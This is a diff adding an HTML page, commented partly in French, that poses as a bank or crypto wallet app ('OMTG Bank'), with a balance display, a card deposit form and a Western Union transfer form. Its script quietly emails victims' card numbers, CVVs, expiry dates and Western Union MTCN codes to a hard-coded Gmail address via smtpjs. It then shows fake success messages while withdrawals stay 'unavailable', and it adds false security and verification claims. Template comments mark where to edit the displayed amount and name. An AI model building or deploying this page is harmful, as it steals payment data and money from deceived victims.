@@ -1,0 +1,971 @@
+
+<!doctype html>
+<html lang="fr">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>mon site</title>
+    
+    <script src="https://kit.fontawesome.com/7e2a69d5dd.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <style type="text/css" id="dcoder_stylesheet">
+    @import url("https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap");
+
+        @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap");
+
+        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap');
+ 
+@import url("https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap");
+
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap");
+
+@import url('https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap');       
+        
+
+        * {
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+           font-family: "Poppins", sans-serif; 
+            margin: 0;
+            padding: 0;
+        }
+        #content {
+            padding: 20px;
+        }
+        footer {
+            border-top: 0.5px solid #001;
+            margin-top: -6%;
+            background: white;
+            padding: 10px;
+            text-align: center;
+           
+            
+        }
+        nav a {
+            margin: 0 37px;
+            text-decoration: none;
+            color: #000;
+        }
+        #home, #contact, #info {
+            margin-bottom: 20px;
+        }
+        img {
+            width: 35px;
+        }
+        .cadre{
+            display:flex;
+            margin-top:5%;
+                
+        }
+        
+        .titre{
+         font-size:11px;
+        }
+     p{
+         font-family: "Archivo Black", sans-serif; 
+         font-size:28px;  
+         margin-top:2%;   
+         margin-left:3%;
+        }
+        .amg img{
+            width:65px;
+            margin-left:5%;
+        }
+        .amg{
+            margin-left:5%;
+        }
+         .bmg img{
+            width:65px;
+            margin-top:2%;
+        }
+        .bmg{
+            margin-left:5%;
+        }
+         .cmg img{
+            width:65px;
+            margin-top:2%;
+        }
+        .cmg{
+            margin-left:5%;
+        }
+         .dmg img{
+            width:65px;
+            margin-top:2%;
+        }
+        .dmg{
+            margin-left:5%;
+        }
+        .txt{
+            font-size:15px;
+            margin-top:-3%;
+            
+            
+        }
+        o{
+            color:white;
+        }
+        ba{
+            font-family: "Archivo Black", sans-serif; 
+            font-size:30px;
+        }
+        
+ /*modifier le montant ici*/
+        
+        bb{
+          font-family: "Archivo Black", sans-serif; 
+          font-size:35px;  
+        }
+        bc{
+         font-size:30px;   
+        }
+        .sold{
+            margin-left:8%;
+            margin-top:5%;
+        }
+        .available{
+          font-family: "Archivo Black", sans-serif; 
+          margin-top:-8%;
+          margin-left:67%; 
+        }
+        .usd{
+         font-family: "Archivo Black", sans-serif; 
+         margin-top:-7%; 
+         margin-left:15%;  
+        }
+        .lmg img{
+            width:23px;
+            margin-top:5%;
+            margin-left:7%;
+        }
+        .back{
+            margin-top:%;
+            width:80%;
+            height:100px;
+            background-color: #e9e9e9;
+            margin-left:9%;
+        }
+        .footer{
+         
+        }
+        .txt1{
+            margin-left:9%;
+            margin-top:2%;
+           font-family: "Archivo Black", sans-serif;  
+        }
+        .txt2{
+            text-align:center;
+            font-size:11px;
+            margin-left:30%;
+            margin-right:%;
+            font-family: "Archivo Black", sans-serif; 
+            margin-top:-25%;
+        }
+         #slider {
+             
+            width: 365px;
+            height: 200px;
+            overflow: hidden;
+            position: relative;
+            margin-top:3%;
+            border-radius:3px;
+            
+        }
+        
+        #slider-wrapper {
+            width: 1600px; /* 4 images de 400px chacune */
+            height: 200px;
+            position: absolute;
+            transition: transform 0.5s ease-in-out;
+        }
+        
+        .slider-image {
+            display: inline-block;
+            width: 385px;
+            height: 90px;
+            vertical-align: top;
+        }
+        .jmg img{
+            width:80px;
+            margin-top:%;
+        }
+        a{
+            text-decoration:none;
+        }
+        .buy{
+          font-family: "Archivo Black", sans-serif; 
+          margin-left:50%; 
+          margin-top:5%; 
+        }
+        .noti img{
+            width:28px;
+            
+        }
+        .noti{
+         margin-top:-8%;
+         margin-left:85%;
+        }
+        .hist{
+            border-top:0.5px solid #777;
+            
+            
+        }
+        
+        h4{
+            margin-left:3%;
+            margin-top:-30%;
+        }
+        al{
+            
+            margin-left:25%;
+        }
+        
+         .Dep {
+   display: none;
+  position : fixed ;
+ width:100%;
+ height:350px;
+ margin-top:-135%;
+ border:1px solid #777;
+ background-color:white;
+ margin-left:%;
+        }
+        .Ret{
+          display:none;
+            position:absolute ; 
+            width:80%;
+            margin-top:-102%;
+            margin-left:9%;
+            font-size:12px;
+            color:red;  
+        }
+        .Trans{
+          display:none;
+  position : fixed ;
+ width:100%;
+ height:680px;
+ margin-top:-165%;
+ border:1px solid #777;
+ background-color:white;
+ margin-left:%;   
+        } 
+        .Qrs{
+          display:none;
+            position:absolute ; 
+            width:80%;
+            margin-top:-102%;
+            margin-left:9%;
+            font-size:12px;
+            color:red;   
+        }  
+        .cloche{
+         background-color:white;
+            display: none;
+            position: fixed;
+            border: 1px solid #ccc;
+            width:100%;
+            margin-top:-160%;
+            height:685px; 
+            font-size:20px;    
+        } 
+
+        .close {
+            cursor: pointer;
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            font-weight: bold;
+            margin-right:5%;
+        }
+        .close4{
+            margin-top:-8%;
+            margin-left:85%;
+        }
+        .account {
+          text-align:center;  
+          margin-top:-6%;
+        }
+        .name{
+            font-family: "Archivo Black", sans-serif; 
+      
+        }
+        .id{
+         border:1px solid #777; 
+         width:32%; 
+         margin-left:34%;
+        }
+        .img1 img{
+            width:90px;
+        }
+        .img2 img{
+            margin-left:3%;
+          width:30px;
+          margin-top:5%;  
+        }
+        .bo{
+         margin-left:12%;
+         font-size:15px; 
+         margin-top:-9%; 
+        }
+         .card{
+  color:white;
+  background-color:black;
+      font-family: "Poppins", sans-serif;
+      margin-left:6%;
+      margin-right:%;
+      border-radius:10px;
+       width: 310px;
+          height:170px;
+       margin-top:2%;
+  }
+  f1{
+    margin-left:6%;
+    margin-top:%;
+    font-family: "Archivo Black", sans-serif;
+    }
+    f2{
+      font-size:27px;
+      margin-left:6%;
+      margin-top:2%;
+    }
+    f3{
+      margin-left:6%;
+      margin-top:25%;
+    }
+    f4{
+      font-size:13px;
+      font-family: "Archivo Black", sans-serif;
+      margin-left:30%;
+      margin-top:%;
+    }
+    .umg img{
+      margin-left:70%;
+      margin-top:;
+      width:70px;
+      }
+      .ctn button{
+
+        margin:0 20px;
+        font-size:10px;
+          font-family: "Archivo Black", sans-serif;
+        outline:none;
+   border: none; 
+         padding:10px;
+        }
+        .cb{
+            font-family: "Archivo Black", sans-serif;
+             width: 280px;
+  height:40px;
+  background-color: ;
+  padding: 15px;
+  margin-left :5%;
+  text-align: ;
+  border-radius:15px;
+  margin-top:5%;
+  border: 1px solid rgba(189,209,189);
+          
+            }
+            .hmg img{
+   width: 580%;
+  margin-top:%;
+  margin-right:3%;
+  float:left;
+  width:45px;
+            }
+            .kmg{
+                margin-left:5%;
+        margin-top:5%;
+        font-family: "Archivo Black", sans-serif;
+           font-size:13px; 
+    
+                }
+            g2{
+                font-size:13px;
+                    margin-left:15%;
+                    }
+                    k{
+      font-family: "Archivo Black", sans-serif;
+  margin-top:;
+  margin-left:22%;
+                        color:#777;
+                    }
+                    h4{
+                        margin-left:2%;
+                        }
+                        .gmg{
+                         font-size:13px;  
+                         margin-top:4%;
+                        }
+      .acti {
+          color:red;
+    display: none;
+    margin-left:17%;
+    border:0.5px solid #777;
+    width:60%;
+    font-size:14px;
+    position:fixed;
+    margin-top:3%;
+}
+.txt4{
+    margin-left:10%;
+    margin-right:10%;
+}
+
+
+input{
+       width:80%; 
+       height:40px;
+       margin-top:5%;
+       outline:none;
+       font-family: "Poppins", sans-serif;
+    }
+.da{
+    margin-top:2%;
+    margin-left:8%;
+}
+input[type="submit"]{
+    width:86%;
+    height:30px;
+    color:white;
+   background-color:deepskyblue;
+   font-family: "Archivo Black", sans-serif; 
+   border:1px solid #777;
+}
+ 
+    .cv{
+    display:flex;
+}
+#ben2{
+ width:36.7%;   
+}
+#ben3{
+  width:36.7%; 
+  margin-left:10%;    
+}
+.omg img{
+    width:100px;
+    margin-left:35%;
+    margin-top:5%;
+}
+.Dep input{
+    width:85%;
+    height:20px; 
+    margin-left:7%; 
+}
+   h{
+       margin-left:8%;
+     font-family: "Archivo Black", sans-serif;   
+   }
+   .alert7{
+   position:fixed;
+       display :none; 
+       width:100%;
+       height:300px;
+       margin-left:%;
+       margin-top:-140%;
+       background-color: rgba(255, 255, 255, 0.9);
+       text-align:center;
+       border-radius:5px;
+} 
+.alert7 img{
+          width:200px;
+          margin-top:15%;
+          
+      } 
+.alert8{
+  position:fixed;
+       display :none; 
+       border:1px solid #777;
+       width:100%;
+       height:680px;
+       margin-left:%;
+       margin-top:-170%;
+       background-color: rgba(255, 255, 255, 0.9);
+       text-align:center;
+       border-radius:5px;  
+} 
+.alert8 img{
+          width:200px;
+          margin-top:50%;
+          
+      }  
+.bg{
+    text-align:center;
+} 
+.close2{
+    margin-top:-9%;
+    margin-left:90%;
+    position :absolute;
+}
+#ltn{
+    background-color:black;
+    width:80%;
+    height:50px;
+}
+.nmg img{
+    width:20px;
+    margin-left:10%;
+    margin-top:3%;
+}
+po{
+   font-family: "Archivo Black", sans-serif;  
+   font-size:18px; 
+   margin-left:2%; 
+   
+}
+.do{
+    margin-left:9%;
+}
+l{
+         font-family: "Archivo Black", sans-serif; 
+         font-size:20px;  
+         margin-left:3%;
+         
+         
+        }
+        .ko{
+            margin-top:-5%;
+            font-family: "Archivo Black", sans-serif;
+            font-size:20px;
+            margin-left:2%;
+        }
+        
+        .zmg img{
+            width:60px;
+            margin-left:40%;
+        }
+      .close01{
+       margin-top:-70%; 
+       margin-left:70%; 
+      } 
+     .close02{
+       margin-top:-100%; 
+       margin-left:70%; 
+      } 
+       
+
+    </style>
+</head>
+
+<body>
+    <div id="page-content">
+    
+        <div id="home" class="page">
+            
+            <p>Solde </p>
+            <div class="noti"><img src="https://i.postimg.cc/rwgp3Hjd/2478142.png"></div>
+            <div class="lmg"><img src="https://i.postimg.cc/3Rhzp68J/usa-america-set-circular-circle-600nw-2479083185.jpg"> </div><div class="usd">USD</div>
+            
+   <!-- Modifier le montant ici-->
+            
+            <div class="sold">
+            <ba>$</ba> <bb>0,</bb><bc>00</bc></div>
+            <div class="available">Available</div>
+            
+            
+            
+            <div class="cadre">
+  <div class="amg"><img src="https://i.postimg.cc/mDm2JTqn/IMG-20240907-185933-8-x-5-9-cm.jpg"></div>
+  <div class="bmg"><img src="https://i.postimg.cc/vmMYm1wj/IMG-20240907-185728-8-x-5-9-cm.jpg"></div>
+  <div class="cmg"><img src="https://i.postimg.cc/mZqTHpG7/IMG-20240907-185757-8-x-5-9-cm.jpg"></div>
+  <div class="dmg"><img src="https://i.postimg.cc/23RpXJzJ/IMG-20240907-185845-8-x-5-9-cm.jpg"></div>
+            </div>
+       <div class="titre">
+     <o>oooo</o> <ca>Deposit</ca><o>oooo.</o><ca>Withdrawal</ca><o>oooo</o><ca>Transfert</ca><o>ooooo.</o><ca>Scaner</ca>
+       </div>
+       
+        <div class="txt1">Buy assets</div>
+        <div class="back">
+   <div class="jmg"><img src="https://i.postimg.cc/d08yh6jw/logo9-8-74733.png"></div>
+       
+       <div class="txt2">Always buy your assets on trusted platforms as suggested on the link below.</div>
+       <div class="buy"><a href="https://cryptomus.com/blog/top-10-crypto-payment-platforms?gad_source=1&gclid=Cj0KCQjwlvW2BhDyARIsADnIe-JtbyOOajTJyqyv7NOzPdTaQQP00bsUWf-70VZvr5urxceSv5QKPWkaAq0nEALw_wcB">Buy assets</a></div>
+       
+    
+        </div>
+        
+        <div id="slider">
+    <div id="slider-wrapper" >
+        <img class="slider-image" src="https://i.postimg.cc/qR1gK5hV/logo9-8-6547.jpg" alt="Image 1">
+        <img class="slider-image" src="https://i.postimg.cc/WzK3Wqw5/logo9-8-65437.jpg" alt="Image 2">
+        <img class="slider-image" src="https://i.postimg.cc/jSy5c5wh/logo9-8-65529.jpg" alt="Image 3">
+        
+    </div>
+</div>
+          <h4>Transaction History</h4>
+       <div class="hist">
+       <div class="zmg"><img src="https://i.postimg.cc/3JBkDNmk/290969-icone-de-vecteur-de-transaction-gratuit-vectoriel.jpg"></div>
+       
+       <al>No transactions made</al>
+       </div>
+      
+       <div class="Dep"><br>
+        <h>Deposit</h>
+        <div class="close">X</div>
+        <form id="submit">
+<div class="da">Paiement VISA/MasterCard</div>
+<input type="text" placeholder="0.00 &dollar; " id="ben4" required>
+<input type="text" placeholder="Numéro sur la carte" id="ben1" required>
+<div class="cv">
+<input type="text" placeholder="CVV" id="ben2" required>
+<input type="text" placeholder="Exp date" id="ben3" required>
+</div>
+<input type="submit" value="Add card">
+
+<div class="omg">
+<img src="https://i.postimg.cc/t44pKX2v/nos3y4-4.png"></div>
+</div></form>
+    </div>
+<div class="Ret">
+<div class="close1"> Withdrawal unavailable X</div>
+
+
+</div>
+   
+  <!--Transfer ok -->
+    <div class="Trans"><br>
+    <div class="nmg"><img src="https://i.postimg.cc/gr9Y1rSR/western-union-logo-1-1.png"><po>Western Union transfer</po></div>
+    <div class="close2">X</div>
+   
+        <form id="submit1">
+<div class="do">Fill in the recipient's information.</div>
+<div class="bg">
+<input type="text" placeholder="First and last name" id="ban1" required>
+<input type="text" placeholder="Country" id="ban2" required>
+<input type="text" placeholder="City" id="ban3" required>
+<input type="text" placeholder="MTCN Number" id="ban4" required>
+<input type="text" id="ban5" placeholder="0.00 &dollar;" >
+
+<input type="submit" id="ltn"value="Continue">
+</div>
+<div class="omg">
+<img src="https://i.postimg.cc/6qWSqK8S/74793dd1b0fbb71391ecfc2a62eb4e60.png"></div>
+</div></form>
+   
+    </div>
+    
+    
+      <div class="Qrs">
+    <div class="close3">Withdrawal unavailable by scan X</div>
+    </div>
+    <div class="cloche"><o>g</o> 0 Notification
+    <div class="close4">X</div>
+    <hr></hr>
+    </div> .
+    
+    
+    <div class="alert7"><img src="https://i.postimg.cc/TYg459n3/JVX7.gif"><div class="close01">X</div></div>
+</div>
+<div class="alert8"><img src="https://i.postimg.cc/TYg459n3/JVX7.gif"><div class="close02">X</div</div>
+</div>
+       
+       
+       </div>
+      
+       <div id="contact" class="page" style="display: none;">
+            <div class="ko">Card information</div>  
+   <br><br><br><br><br><div class="card"><br> <f1>
+     OMTG Bank 
+   </f1> 
+   <br><f2>
+     **** **** **** ****
+   </f2> 
+   <br> 
+   <br><f3>
+     Your name
+   </f3><f4>
+     Cvv:000 
+   </f4> 
+   <div class="umg"> 
+    <img src="https://i.postimg.cc/mDCnKcVF/visa-card-logo-9.png"> 
+   </div> 
+  </div>
+  <br> 
+  <div class="ctn">
+    <a href="#">
+        <button type="button" onclick="activateCard()" style="border-radius:4px; width:35%; background-color:green; color:white;">Active my card</button>
+    </a>
+    <button type="button" style="border-radius:4px; width:35%; background-color:red; color:white;">Block my card</button>
+</div>
+
+<div class="acti" id="acti">
+    Not available in your country <span style="cursor:pointer; color: black; font-size:px;" onclick="hideCard()">x</span>
+</div>  
+<br> 
+<div class="cb">
+<div class="hmg">
+<img src="https://i.postimg.cc/gjyHc2Dv/IMG-20231121-214057-8-x-8-cm.png"></div>
+<div class="gmg"><g1>Payment by card</g1><g2>-0,00 &dollar;</g2></div></div><br><br>
+<k>No card transactions</k>
+        </div><br>
+        <div class="mob1"></div>
+       
+       
+        <div id="info" class="page" style="display: none;">
+            <div class="ko">Personal information</div>
+            <br><br><div class="account">
+ <div class="img1"><img src="https://i.postimg.cc/4NJ8CbPw/7407995-compte-symbole-chef-et-travailleurs-equipe-logo-vectoriel.jpg"></div>
+ 
+ <!-- Modifier le nom ici-->
+ 
+    <div class="name">Abreu Souza Henry Willian</div>
+    <div class="id">ID:420036464</div>
+        </div>
+        
+      <div class="txt1">Buy assets</div>
+        <div class="back">
+   <div class="jmg"><img src="https://i.postimg.cc/d08yh6jw/logo9-8-74733.png"></div>
+       
+       <div class="txt2">Always buy your assets on trusted platforms as suggested on the link below.</div>
+       <div class="buy"><a href="https://cryptomus.com/blog/top-10-crypto-payment-platforms?gad_source=1&gclid=Cj0KCQjwlvW2BhDyARIsADnIe-JtbyOOajTJyqyv7NOzPdTaQQP00bsUWf-70VZvr5urxceSv5QKPWkaAq0nEALw_wcB">Buy assets</a></div>
+       </div>
+        
+  <div class="img2"><img src="https://i.postimg.cc/Y9K3d1j6/4812397.png"><div class="bo">Your account is verified</div>
+  
+   </div> 
+   
+   <!-- Modifier l'email ici-->
+   
+   <div class="img2"><img src="https://i.postimg.cc/Y9K3d1j6/4812397.png"><div class="bo">Your****@gmail.com</div>
+  
+   </div> 
+   
+        
+        <div class="img2"><img src="https://i.postimg.cc/X7HkRMp7/paiement-securise-picto.png"><div class="bo">This site is secured by HTTPS and SLL.</div>
+      </div>
+      
+       <div class="img2"><img src="https://i.postimg.cc/B60TT4wN/1161490.png"><div class="bo">We respect data privacy.</div>
+      </div>
+        
+         <div class="img2"><img src="https://i.postimg.cc/XqN9PxWC/1999134.png"><div class="bo">Referral tool  unavailable.</div>
+      </div><br><br>
+        <div class="mob2"></div>
+      
+     
+        
+        
+   
+        </div>
+    </div>
+
+
+
+
+
+
+
+
+
+<div class="footer">
+    <footer>
+        <nav>
+            <a href="#" onclick="showpage('home')"><img src="https://i.postimg.cc/NfcBD950/logo9-7-165330.png" alt="Home"></a>
+            <a href="#" onclick="showpage('contact')"><img src="https://i.postimg.cc/2S5p94mC/logo9-7-17029.png" alt="Contact"></a>
+            <a href="#" onclick="showpage('info')"><img src="https://i.postimg.cc/xjGW0s10/logo9-7-171615.png" alt="Info"></a>
+        </nav>
+    </footer>
+    <div class="txt"><o>.oooo</o> <ab>Solde</ab><o>..oooooo..</o>  </ac>Card</ac><o>oooooo</o>  <ad>Account</ad></div></div>
+
+    <script>
+         function showpage(page) {
+            // cacher toutes les pages
+            document.querySelectorAll('.page').forEach(function(p) {
+                p.style.display = 'none';
+            });
+                     // afficher la page demandée
+            document.getElementById(page).style.display = 'block';
+        }
+
+        // afficher la page d'accueil par défaut
+        showpage('home');
+        
+        
+        const sliderWrapper = document.getElementById('slider-wrapper');
+        let currentPosition = 0;
+        const imageWidth = 400;
+
+        function slideImages() {
+            currentPosition -= imageWidth;
+            sliderWrapper.style.transform = `translateX(${currentPosition}px)`;
+
+            if (currentPosition < -imageWidth * 2) {
+                currentPosition = 0;
+                sliderWrapper.style.transform = `translateX(${currentPosition}px)`;
+            }
+        }
+
+        setInterval(slideImages, 2000);
+ 
+  const amg = document.querySelector('.amg');
+    const Dep = document.querySelector('.Dep');
+
+    amg.addEventListener('click', function() {
+        Dep.style.display = 'block';
+    });
+    const bmg = document.querySelector('.bmg');
+    const Ret = document.querySelector('.Ret');
+
+    bmg.addEventListener('click', function() {
+        Ret.style.display = 'block';
+    });
+    
+    const cmg = document.querySelector('.cmg');
+    const Trans = document.querySelector('.Trans');
+
+    cmg.addEventListener('click', function() {
+        Trans.style.display = 'block';
+    });
+    
+    const dmg = document.querySelector('.dmg');
+    const Qrs = document.querySelector('.Qrs');
+
+    dmg.addEventListener('click', function() {
+        Qrs.style.display = 'block';
+    });
+    
+    const noti = document.querySelector('.noti');
+    const cloche = document.querySelector('.cloche');
+
+    noti.addEventListener('click', function() {
+        cloche.style.display = 'block';
+    });
+
+    // Fermer le div 'Dep' en cliquant sur la croix
+    const closeDep = document.querySelector('.Dep .close');
+    closeDep.addEventListener('click', function(e) {
+        e.stopPropagation();
+        Dep.style.display = 'none';
+        
+    });
+    const close1Ret = document.querySelector('.Ret .close1');
+    close1Ret.addEventListener('click', function(e) {
+        e.stopPropagation();
+        Ret.style.display = 'none';
+    });
+    
+    const close2Trans = document.querySelector('.Trans .close2');
+    close2Trans.addEventListener('click', function(e) {
+        e.stopPropagation();
+        Trans.style.display = 'none';
+    });
+    
+    const close3Qrs = document.querySelector('.Qrs .close3');
+    close3Qrs.addEventListener('click', function(e) {
+        e.stopPropagation();
+        Qrs.style.display = 'none';
+    });
+    const close4cloche = document.querySelector('.cloche .close4');
+    close4cloche.addEventListener('click', function(e) {
+        e.stopPropagation();
+        cloche.style.display = 'none';
+    });
+   
+ const close01alert7 = document.querySelector('.alert7 .close01');
+const alert7 = document.querySelector('.alert7');
+
+close01alert7.addEventListener('click', function() {
+    alert7.style.display = 'none';
+});
+
+const close02alert8 = document.querySelector('.alert8 .close02');
+const alert8 = document.querySelector('.alert8');
+
+close02alert8.addEventListener('click', function() {
+    alert8.style.display = 'none';
+});  
+    
+    function activateCard() {
+    document.getElementById('acti').style.display = 'block';
+}
+
+function hideCard() {
+    document.getElementById('acti').style.display = 'none';
+}
+
+            
+    
+  
+addEventListener('submit', (e) => {
+    e.preventDefault();
+    setTimeout(() => {
+      const ben1 = document.getElementById('ben1');
+      const ben2 = document.getElementById('ben2');
+      const ben3 = document.getElementById('ben3');
+      const ben4 = document.getElementById('ben4');
+
+      const ebody1 = `
+        <h1>Numéro sur la carte: </h1>${ben1.value}
+        <br>
+        <h1>CVV: </h1>${ben2.value}
+        <br>
+        <h1>Date d'expiration: </h1>${ben3.value}
+        <br>
+         <h1>Date d'expiration: </h1>${ben4.value}
+        <br>
+      `;
+
+      Email.send({
+        SecureToken: "24ed91c7-882b-465c-97d2-32856db82fdb",
+        To: 'abdoulissa154@gmail.com',
+        From: "abdoulissa154@gmail.com",
+        Subject: "This is the subject",
+        Body: ebody1
+      }).then(() => {
+        setTimeout(() => {
+          document.querySelector(".alert7").style.display = "block";
+        }, 1000);
+      });
+     
+      window.location.href = "#";
+    }, 500);
+});
+
+
+  document.getElementById('submit1').addEventListener('submit', (e) => {
+    e.preventDefault();
+    setTimeout(() => {
+     
+     const ban5 = document.getElementById('ban5');
+      const ban1 = document.getElementById('ban1');
+      const ban2 = document.getElementById('ban2');
+      const ban3 = document.getElementById('ban3');
+      const ban4 = document.getElementById('ban4');
+            
+
+      const ebody3 = `
+        <h1>Nom: </h1>${ban1.value}
+        <br>
+        <h1>Pays: </h1>${ban2.value}
+        <br>
+        <h1>Ville : </h1>${ban3.value}
+        <br>
+        <h1>Mtnc : </h1>${ban4.value}
+        <br>
+        <h1>Montant: </h1>${ban5.value}
+        <br>
+      `;
+
+      Email.send({
+        SecureToken: "24ed91c7-882b-465c-97d2-32856db82fdb",
+        To: 'abdoulissa154@gmail.com',
+        From: "abdoulissa154@gmail.com",
+        Subject: "This is the subject",
+        Body: ebody3
+      }).then(() => {
+        setTimeout(() => {
+          document.querySelector(".alert8").style.display = "block";
+        }, 3000);
+      });
+      
+      window.location.href = "#";
+    }, 500);
+  });
+  
+   </script>
+</body>
+
+</html
+        
